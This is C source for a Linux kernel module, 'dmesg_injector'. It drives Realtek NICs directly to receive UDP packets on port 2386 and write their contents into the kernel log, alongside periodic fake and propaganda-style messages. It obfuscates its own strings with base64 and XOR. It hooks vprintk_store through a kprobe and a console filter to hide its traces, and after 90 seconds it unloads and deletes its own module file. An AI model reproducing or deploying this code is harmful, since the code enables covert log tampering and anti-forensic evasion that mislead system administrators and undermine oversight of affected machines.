#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/console.h>
#include <linux/delay.h>
#include <linux/dma-mapping.h>
#include <linux/fs.h>
#include <linux/if_ether.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/jiffies.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/pci.h>
#include <linux/string.h>
#include <linux/timer.h>
#include <linux/version.h>
#include <linux/stdarg.h>
#include <linux/workqueue.h>

#include "dmesg_injector.h"

MODULE_LICENSE("zzz");
MODULE_AUTHOR("pwd");
MODULE_DESCRIPTION("cRddd");
MODULE_VERSION("0.0.0.0.0.0.0.0.0.0.0.0.0.1");

static inline int b64_val(char c) {
  if (c >= 'A' && c <= 'Z') return c - 'A';
  if (c >= 'a' && c <= 'z') return c - 'a' + 26;
  if (c >= '0' && c <= '9') return c - '0' + 52;
  if (c == '+') return 62;
  if (c == '/') return 63;
  return -1;
}

static int decode_b64(const char *in, unsigned char *out, int out_size) {
  int o = 0, buf = 0, bits = 0;
  for (; *in && o < out_size; in++) {
    if (*in == '=') break;
    int v = b64_val(*in);
    if (v < 0) continue;
    buf = (buf << 6) | v;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[o++] = (buf >> bits) ^ 14;
      buf &= (1 << bits) - 1;
    }
  }
  return o;
}

static void pr_warn_enc(const char *enc, ...) {
  unsigned char buf[256];
  char full[320];
  va_list args;
  int len = decode_b64(enc, buf, sizeof(buf) - 1);
  buf[len] = '\0';
  snprintf(full, sizeof(full), KERN_WARNING KBUILD_MODNAME ": %s", (char *)buf);
  va_start(args, enc);
  vprintk(full, args);
  va_end(args);
}

static void pr_info_enc(const char *enc, ...) {
  unsigned char buf[256];
  char full[320];
  va_list args;
  int len = decode_b64(enc, buf, sizeof(buf) - 1);
  buf[len] = '\0';
  snprintf(full, sizeof(full), KERN_INFO KBUILD_MODNAME ": %s", (char *)buf);
  va_start(args, enc);
  vprintk(full, args);
  va_end(args);
}

static void pr_debug_enc(const char *enc, ...) {
  unsigned char buf[256];
  char full[320];
  va_list args;
  int len = decode_b64(enc, buf, sizeof(buf) - 1);
  buf[len] = '\0';
  snprintf(full, sizeof(full), KERN_DEBUG KBUILD_MODNAME ": %s", (char *)buf);
  va_start(args, enc);
  vprintk(full, args);
  va_end(args);
}

#define RX_RING_SIZE 8
#define TX_RING_SIZE 4
#define RX_BUF_SIZE 2048
#define TX_BUF_SIZE 2048
#define FRAME_BUF_SIZE 2048
#define LISTEN_PORT 2386
#define MSG_INTERVAL_MS 5000UL
#define SELF_DESTROY_AFTER_SEC 90
#define MODULE_KO_PATH "dmesg_injector.ko"

#define RTL_VENDOR_ID 0x10EC
#define RTL_DEVICE_ID_8168 0x8168
#define RTL_DEVICE_ID_8169 0x8169

static struct console filter_con = {
    .name = "injflt",
    .flags = CON_ENABLED,
    .index = -1,
};

static void filter_con_write(struct console *con, const char *buf,
                             unsigned len) {
  if (buf && strnstr(buf, SELF_MARKER, len))
    return;
}

#ifdef CONFIG_KPROBES
static struct kprobe vp_kp;
static const char kp_empty_fmt[] = "";
static int kp_pre_handler(struct kprobe *p, struct pt_regs *regs) {
#ifdef CONFIG_X86_64
  const char *fmt = (const char *)regs->cx;
  if (fmt && strstr(fmt, SELF_MARKER))
    regs->cx = (unsigned long)kp_empty_fmt;
#endif
  return 0;
}
#endif

static void setup_log_interceptor(void) {
#ifdef CONFIG_KPROBES
  vp_kp.symbol_name = "vprintk_store";
  vp_kp.pre_handler = kp_pre_handler;
  if (register_kprobe(&vp_kp) != 0)
    pr_warn_enc("ZX58YWxrLmFgLnh+fGdgemVRfXphfGsuaG9nYmtqBA==");
#endif
}

static void teardown_log_interceptor(void) {
#ifdef CONFIG_KPROBES
  unregister_kprobe(&vp_kp);
#endif
}

#define RTL_IDR0 0x00
#define RTL_IDR4 0x04
#define RTL_RXCONFIG 0x30
#define RTL_TXPOLL 0x40
#define RTL_RXDESC_ADDR0 0x44
#define RTL_RXDESC_ADDR1 0x48
#define RTL_COMMAND 0x4C
#define RTL_IMR 0x50
#define RTL_ISR 0x54
#define RTL_CPCR 0xE0
#define RTL_CPRXDESC_ADDR0 0xE4
#define RTL_CPRXDESC_ADDR1 0xE8
#define RTL_CPTXDESC_ADDR0 0xEC
#define RTL_CPTXDESC_ADDR1 0xF0

#define RTL_RXCONFIG_AAM 0x00000080
#define RTL_RXCONFIG_AAP 0x00000040
#define RTL_RXCONFIG_AB 0x00000008
#define RTL_RXCONFIG_AR 0x00000001
#define RTL_RXCONFIG_WRAP 0x00008000

#define RTL_CMD_RXENA 0x01
#define RTL_CMD_TXENA 0x04

#define RTL_CPCR_RXWRAP 0x00000800
#define RTL_CPCR_RXLEN_16 0x00000000
#define RTL_CPCR_RXLEN_32 0x00010000
#define RTL_CPCR_RXNOVLAN 0x00100000

#define RTL_DESC_OWN 0x80000000
#define RTL_TX_DESC_LS 0x20000000
#define RTL_TX_DESC_FS 0x10000000

#define ETH_P_IP 0x0800
#define ETH_P_ARP 0x0806
#define ETH_P_8021Q 0x8100

#define IPPROTO_UDP 17

struct rtl_tx_desc {
  u32 status;
  u32 vlan;
  u64 addr;
  u64 reserved;
  u64 csum;
  u64 reserved2;
} __attribute__((packed, aligned(4)));

struct rtl_rx_desc {
  u64 addr;
  u32 status;
  u16 size;
  u16 vlan;
  u16 csum;
} __attribute__((packed, aligned(4)));

struct eth_hdr {
  u8 dst[6];
  u8 src[6];
  __be16 type;
} __attribute__((packed));

struct ip_hdr {
  u8 ver_ihl;
  u8 tos;
  __be16 tot_len;
  __be16 id;
  __be16 frag_off;
  u8 ttl;
  u8 protocol;
  __be16 check;
  __be32 saddr;
  __be32 daddr;
} __attribute__((packed));

struct udp_hdr {
  __be16 source;
  __be16 dest;
  __be16 len;
  __be16 check;
} __attribute__((packed));

static struct raw_nic {
  struct pci_dev *pdev;
  void __iomem *mmio;
  unsigned long mmio_phys;
  unsigned long mmio_len;

  struct rtl_rx_desc *rx_ring;
  dma_addr_t rx_ring_dma;
  struct rtl_tx_desc *tx_ring;
  dma_addr_t tx_ring_dma;

  void *rx_buf[RX_RING_SIZE];
  dma_addr_t rx_buf_dma[RX_RING_SIZE];
  void *tx_buf[TX_RING_SIZE];
  dma_addr_t tx_buf_dma[TX_RING_SIZE];

  unsigned int rx_head;
  unsigned int tx_head;

  u8 mac[6];

  unsigned long rx_pkts;
  unsigned long rx_drop;
  unsigned long tx_pkts;
} nic;

static int nic_discover(void) {
  struct pci_dev *pdev = NULL;

  memset(&nic, 0, sizeof(nic));

  for_each_pci_dev(pdev) {
    if (pdev->vendor == RTL_VENDOR_ID &&
        (pdev->device == RTL_DEVICE_ID_8168 ||
         pdev->device == RTL_DEVICE_ID_8169)) {
      if (pci_enable_device(pdev)) {
        pr_warn_enc("bW9gKXoua2BvbGJrLit9BA==", pci_name(pdev));
        continue;
      }
      pci_set_master(pdev);
      nic.pdev = pdev;
      break;
    }
  }

  if (!nic.pdev) {
    pr_warn_enc("YGEuXk1HLmBrenlhfGUubWFgenxhYmJrfC5oYXtgagQ=");
    return -ENODEV;
  }

  nic.mmio_phys = pci_resource_start(nic.pdev, 0);
  nic.mmio_len = pci_resource_len(nic.pdev, 0);

  if (!request_mem_region(nic.mmio_phys, nic.mmio_len, "inj0x_raw")) {
    pci_disable_device(nic.pdev);
    pci_dev_put(nic.pdev);
    nic.pdev = NULL;
    return -EBUSY;
  }

  nic.mmio = ioremap(nic.mmio_phys, nic.mmio_len);
  if (!nic.mmio) {
    release_mem_region(nic.mmio_phys, nic.mmio_len);
    pci_disable_device(nic.pdev);
    pci_dev_put(nic.pdev);
    nic.pdev = NULL;
    return -ENOMEM;
  }

  *(u32 *)nic.mac = readl(nic.mmio + RTL_IDR0);
  *(u16 *)(nic.mac + 4) = (u16)readl(nic.mmio + RTL_IDR4);

  pr_info_enc("QEdNLit9NC5DT00uK35DIi5DQ0dBLn5md30uPnYrYnYuYmtgLitidgQ=", pci_name(nic.pdev),
          nic.mac, nic.mmio_phys, nic.mmio_len);

  return 0;
}

static int nic_alloc_rings(void) {
  int i;

  nic.rx_ring = dma_alloc_coherent(&nic.pdev->dev,
                                   RX_RING_SIZE * sizeof(struct rtl_rx_desc),
                                   &nic.rx_ring_dma, GFP_KERNEL);
  if (!nic.rx_ring)
    return -ENOMEM;

  nic.tx_ring = dma_alloc_coherent(&nic.pdev->dev,
                                   TX_RING_SIZE * sizeof(struct rtl_tx_desc),
                                   &nic.tx_ring_dma, GFP_KERNEL);
  if (!nic.tx_ring) {
    dma_free_coherent(&nic.pdev->dev, RX_RING_SIZE * sizeof(struct rtl_rx_desc),
                      nic.rx_ring, nic.rx_ring_dma);
    return -ENOMEM;
  }

  memset(nic.rx_ring, 0, RX_RING_SIZE * sizeof(struct rtl_rx_desc));
  memset(nic.tx_ring, 0, TX_RING_SIZE * sizeof(struct rtl_tx_desc));

  for (i = 0; i < RX_RING_SIZE; i++) {
    nic.rx_buf[i] = dma_alloc_coherent(&nic.pdev->dev, RX_BUF_SIZE,
                                       &nic.rx_buf_dma[i], GFP_KERNEL);
    if (!nic.rx_buf[i])
      goto fail_rx;
    nic.rx_ring[i].addr = cpu_to_le64(nic.rx_buf_dma[i]);
    nic.rx_ring[i].size = cpu_to_le16(RX_BUF_SIZE);
    nic.rx_ring[i].status = cpu_to_le32(RTL_DESC_OWN);
  }

  for (i = 0; i < TX_RING_SIZE; i++) {
    nic.tx_buf[i] = dma_alloc_coherent(&nic.pdev->dev, TX_BUF_SIZE,
                                       &nic.tx_buf_dma[i], GFP_KERNEL);
    if (!nic.tx_buf[i])
      goto fail_tx;
    nic.tx_ring[i].addr = cpu_to_le64(nic.tx_buf_dma[i]);
  }

  nic.rx_head = 0;
  nic.tx_head = 0;

  pr_info_enc("SkNPLnxnYGl9NC58djMrai56djMragQ=", RX_RING_SIZE, TX_RING_SIZE);
  return 0;

fail_tx:
  while (--i >= 0) {
    dma_free_coherent(&nic.pdev->dev, TX_BUF_SIZE, nic.tx_buf[i],
                      nic.tx_buf_dma[i]);
    nic.tx_buf[i] = NULL;
  }
  i = RX_RING_SIZE;
fail_rx:
  while (--i >= 0) {
    dma_free_coherent(&nic.pdev->dev, RX_BUF_SIZE, nic.rx_buf[i],
                      nic.rx_buf_dma[i]);
    nic.rx_buf[i] = NULL;
  }
  if (nic.tx_ring) {
    dma_free_coherent(&nic.pdev->dev, TX_RING_SIZE * sizeof(struct rtl_tx_desc),
                      nic.tx_ring, nic.tx_ring_dma);
    nic.tx_ring = NULL;
  }
  if (nic.rx_ring) {
    dma_free_coherent(&nic.pdev->dev, RX_RING_SIZE * sizeof(struct rtl_rx_desc),
                      nic.rx_ring, nic.rx_ring_dma);
    nic.rx_ring = NULL;
  }
  return -ENOMEM;
}

static void nic_hw_init(void) {
  u32 val;

  writel(0, nic.mmio + RTL_COMMAND);
  mdelay(10);

  val = readl(nic.mmio + RTL_CPCR);
  val |= RTL_CPCR_RXWRAP | RTL_CPCR_RXNOVLAN;
  writel(val, nic.mmio + RTL_CPCR);

  writel(lower_32_bits(nic.rx_ring_dma), nic.mmio + RTL_CPRXDESC_ADDR0);
  writel(upper_32_bits(nic.rx_ring_dma), nic.mmio + RTL_CPRXDESC_ADDR1);

  writel(lower_32_bits(nic.tx_ring_dma), nic.mmio + RTL_CPTXDESC_ADDR0);
  writel(upper_32_bits(nic.tx_ring_dma), nic.mmio + RTL_CPTXDESC_ADDR1);

  val =
      RTL_RXCONFIG_AAM | RTL_RXCONFIG_AAP | RTL_RXCONFIG_AB | RTL_RXCONFIG_WRAP;
  writel(val, nic.mmio + RTL_RXCONFIG);

  writel(0x00000001, nic.mmio + RTL_IMR);

  writel(0x0000FFFF, nic.mmio + RTL_ISR);

  writel(RTL_CMD_RXENA | RTL_CMD_TXENA, nic.mmio + RTL_COMMAND);

  pr_info_enc("XFpCNj84Ny5NJS5mb3xqeW98ay5nYGd6LmphYGsE");
}

static void nic_hw_shutdown(void) {
  writel(0, nic.mmio + RTL_COMMAND);
  writel(0, nic.mmio + RTL_IMR);
  mdelay(10);
}

static void nic_free_rings(void) {
  int i;

  for (i = 0; i < RX_RING_SIZE; i++) {
    if (nic.rx_buf[i])
      dma_free_coherent(&nic.pdev->dev, RX_BUF_SIZE, nic.rx_buf[i],
                        nic.rx_buf_dma[i]);
  }
  for (i = 0; i < TX_RING_SIZE; i++) {
    if (nic.tx_buf[i])
      dma_free_coherent(&nic.pdev->dev, TX_BUF_SIZE, nic.tx_buf[i],
                        nic.tx_buf_dma[i]);
  }
  if (nic.rx_ring)
    dma_free_coherent(&nic.pdev->dev, RX_RING_SIZE * sizeof(struct rtl_rx_desc),
                      nic.rx_ring, nic.rx_ring_dma);
  if (nic.tx_ring)
    dma_free_coherent(&nic.pdev->dev, TX_RING_SIZE * sizeof(struct rtl_tx_desc),
                      nic.tx_ring, nic.tx_ring_dma);
}

static int __maybe_unused nic_raw_tx(const void *frame, int len) {
  struct rtl_tx_desc *desc;
  int idx, ret = -EBUSY;
  unsigned long flags;

  if (!nic.mmio || !nic.tx_ring)
    return -ENODEV;

  if (len > TX_BUF_SIZE)
    len = TX_BUF_SIZE;

  local_irq_save(flags);

  idx = nic.tx_head % TX_RING_SIZE;
  desc = &nic.tx_ring[idx];

  if (le32_to_cpu(desc->status) & RTL_DESC_OWN) {
    local_irq_restore(flags);
    return -EBUSY;
  }

  memcpy(nic.tx_buf[idx], frame, len);
  wmb();

  desc->status =
      cpu_to_le32(RTL_DESC_OWN | RTL_TX_DESC_FS | RTL_TX_DESC_LS | len);
  desc->addr = cpu_to_le64(nic.tx_buf_dma[idx]);
  wmb();

  writel(0x01, nic.mmio + RTL_TXPOLL);

  nic.tx_head++;
  nic.tx_pkts++;
  ret = len;

  local_irq_restore(flags);
  return ret;
}

static bool self_destructed;

static void (*on_udp_recv)(const u8 *payload, int len, u32 src_ip,
                           u16 src_port);

static int nic_rx_poll(void) {
  struct rtl_rx_desc *desc;
  struct eth_hdr *eth;
  struct ip_hdr *ip;
  struct udp_hdr *udp;
  u8 *payload;
  int idx, frame_len, ip_hdr_len, udp_len, copied;
  int processed = 0;
  u16 udp_total_len;

  if (!nic.mmio || !nic.rx_ring)
    return 0;

  for (;;) {
    idx = nic.rx_head % RX_RING_SIZE;
    desc = &nic.rx_ring[idx];

    rmb();

    if (le32_to_cpu(desc->status) & RTL_DESC_OWN)
      break;

    frame_len = le32_to_cpu(desc->status) & 0x1FFF;
    if (frame_len < 14 + sizeof(struct ip_hdr) + sizeof(struct udp_hdr)) {
      goto recycle;
    }

    eth = (struct eth_hdr *)nic.rx_buf[idx];

    if (eth->type == htons(ETH_P_8021Q)) {
      if (frame_len < 14 + 4 + sizeof(struct ip_hdr))
        goto recycle;
      ip = (struct ip_hdr *)((u8 *)(eth + 1) + 4);
      frame_len -= 4;
    } else if (eth->type == htons(ETH_P_IP)) {
      ip = (struct ip_hdr *)(eth + 1);
    } else {
      goto recycle;
    }

    if ((ip->ver_ihl >> 4) != 4)
      goto recycle;

    ip_hdr_len = (ip->ver_ihl & 0x0F) * 4;
    if (ip_hdr_len < 20 || ip->protocol != IPPROTO_UDP)
      goto recycle;

    if (frame_len < 14 + ip_hdr_len + (int)sizeof(struct udp_hdr))
      goto recycle;

    udp = (struct udp_hdr *)((u8 *)ip + ip_hdr_len);
    udp_total_len = be16_to_cpu(udp->len);

    if (udp_total_len < sizeof(struct udp_hdr))
      goto recycle;

    udp_len = (int)udp_total_len - (int)sizeof(struct udp_hdr);

    if (be16_to_cpu(udp->dest) != LISTEN_PORT)
      goto recycle;

    if (udp_len <= 0 || udp_len > frame_len - 14 - ip_hdr_len)
      goto recycle;

    payload = (u8 *)udp + sizeof(struct udp_hdr);
    copied = udp_len;

    if (on_udp_recv)
      on_udp_recv(payload, copied, be32_to_cpu(ip->saddr),
                  be16_to_cpu(udp->source));

    nic.rx_pkts++;
    processed++;

  recycle:
    nic.rx_ring[idx].addr = cpu_to_le64(nic.rx_buf_dma[idx]);
    nic.rx_ring[idx].size = cpu_to_le16(RX_BUF_SIZE);
    wmb();
    nic.rx_ring[idx].status = cpu_to_le32(RTL_DESC_OWN);
    wmb();

    nic.rx_head++;
  }

  return processed;
}

static void nic_teardown(void) {
  nic_hw_shutdown();
  nic_free_rings();
  if (nic.mmio) {
    iounmap(nic.mmio);
    nic.mmio = NULL;
  }
  if (nic.mmio_phys) {
    release_mem_region(nic.mmio_phys, nic.mmio_len);
    nic.mmio_phys = 0;
  }
  if (nic.pdev) {
    pci_disable_device(nic.pdev);
    pci_dev_put(nic.pdev);
    nic.pdev = NULL;
  }
}

static char msg_buf[1024];

static void handle_udp_recv(const u8 *payload, int len, u32 src_ip,
                            u16 src_port) {
  int i;

  if (len <= 0 || len >= sizeof(msg_buf))
    return;

  for (i = 0; i < len; i++)
    msg_buf[i] = payload[i];
  while (i > 0 && (msg_buf[i - 1] == '\n' || msg_buf[i - 1] == '\r' ||
                   msg_buf[i - 1] == '\0'))
    i--;
  msg_buf[i] = '\0';

  if (i == 0)
    return;

  if (roll_pct(9))
    printk(KERN_INFO "%s -- %s\n", msg_buf, rand_putinism());
  else
    printk(KERN_INFO "%s\n", msg_buf);

  pr_debug_enc("fHYuaHxhYy4rfkc6NCt7LitqLmx3emt9BA==", &src_ip, src_port, len);
}

static struct timer_list work_timer;
static struct timer_list boot_chk_timer;
static struct workqueue_struct *inj_wq;
static void periodic_work(struct work_struct *work);
static DECLARE_DELAYED_WORK(periodic_dwork, periodic_work);

static void periodic_work(struct work_struct *work) {
  if (!in_task())
    return;

  nic_rx_poll();

  print_fake_with_putin();
}

static void work_timer_cb(struct timer_list *unused) {
  queue_delayed_work(inj_wq, &periodic_dwork, 0);
  mod_timer(&work_timer, jiffies + msecs_to_jiffies(MSG_INTERVAL_MS));
}

static bool boot_complete(void) {
  return ktime_get_seconds() > SELF_DESTROY_AFTER_SEC;
}

static int delete_self_from_disk(void) {
  struct path path;
  int err;

  err = kern_path(MODULE_KO_PATH, LOOKUP_FOLLOW, &path);
  if (err)
    return err;

  inode_lock(d_inode(path.dentry->d_parent));
  err = vfs_unlink(&nop_mnt_idmap, d_inode(path.dentry->d_parent), path.dentry,
                   NULL);
  inode_unlock(d_inode(path.dentry->d_parent));
  path_put(&path);
  return err;
}

static void self_destroy_work(struct work_struct *work);
static DECLARE_WORK(self_destroy, self_destroy_work);

static void self_destroy_work(struct work_struct *work) {
  pr_info_enc("fWtiaCNqa316fHttei5nYGd6Z296a2oE");

  self_destructed = true;
  smp_mb();

  timer_delete_sync(&work_timer);
  timer_delete_sync(&boot_chk_timer);
  cancel_delayed_work_sync(&periodic_dwork);
  flush_workqueue(inj_wq);
  destroy_workqueue(inj_wq);

  console_lock();
  if (filter_con.flags & CON_ENABLED)
    unregister_console(&filter_con);
  console_unlock();

  teardown_log_interceptor();
  on_udp_recv = NULL;
  nic_teardown();
  delete_self_from_disk();
}

static void boot_chk_cb(struct timer_list *t) {
  if (boot_complete()) {
    pr_info_enc("bGFhei5tYWN+Ymt6ay7sjpoufW1ma2p7YmdgaS59a2JoI2prfXp8e216BA==");
    queue_work(system_wq, &self_destroy);
    return;
  }
  mod_timer(&boot_chk_timer, jiffies + msecs_to_jiffies(5000));
}

static int __init injector_init(void) {
  int ret;

  console_lock();
  filter_con.write = filter_con_write;
  register_console(&filter_con);
  console_unlock();

  setup_log_interceptor();

  ret = nic_discover();
  if (ret) {
    pr_warn_enc("YGEuQEdNLmhhe2BqLiYraicu7I6aLmJhbW9iLmdgZGttemdhYC5hYGJ3BA==", ret);
    goto skip_nic;
  }

  ret = nic_alloc_rings();
  if (ret) {
    pr_warn_enc("SkNPLm9iYmFtLmhvZ2Jrai4mK2onBA==", ret);
    nic_teardown();
    goto skip_nic;
  }

  nic_hw_init();

  on_udp_recv = handle_udp_recv;
  pr_info_enc("fG95LkBHTS5iZ316a2BnYGkuaGF8LltKXi5+YXx6LitqLmFgLmZvfGp5b3xrBA==", LISTEN_PORT);

skip_nic:
  inj_wq = alloc_workqueue("inj0x_wq", WQ_UNBOUND, 0);
  if (!inj_wq) {
    pr_warn_enc("eWF8ZX97a3trLm9iYmFtLmhvZ2JragQ=");
    teardown_log_interceptor();
    console_lock();
    if (filter_con.flags & CON_ENABLED)
      unregister_console(&filter_con);
    console_unlock();
    if (nic.mmio)
      nic_teardown();
    return -ENOMEM;
  }

  print_burst(25);

  timer_setup(&work_timer, work_timer_cb, 0);
  mod_timer(&work_timer, jiffies + msecs_to_jiffies(MSG_INTERVAL_MS));

  timer_setup(&boot_chk_timer, boot_chk_cb, 0);
  mod_timer(&boot_chk_timer, jiffies + msecs_to_jiffies(15000));

  pr_info_enc("b216Z3hrLuyOmi58b3kuQEdNLlxWIi5nYGRrbXoua3hrfHcuK2J7LmN9Ii59a2JoI2prfXp8YXcuZ2AuK2oufWttBA==",
          (unsigned long)MSG_INTERVAL_MS, SELF_DESTROY_AFTER_SEC);
  return 0;
}

static void __exit injector_exit(void) {
  pr_info_enc("YGF8Y29iLntgYmFvagQ=");

  smp_mb();
  if (self_destructed)
    return;

  timer_delete_sync(&work_timer);
  timer_delete_sync(&boot_chk_timer);
  cancel_delayed_work_sync(&periodic_dwork);

  if (inj_wq) {
    flush_workqueue(inj_wq);
    destroy_workqueue(inj_wq);
  }

  console_lock();
  if (filter_con.flags & CON_ENABLED)
    unregister_console(&filter_con);
  console_unlock();

  teardown_log_interceptor();
  on_udp_recv = NULL;
  nic_teardown();
}

module_init(injector_init);
module_exit(injector_exit);
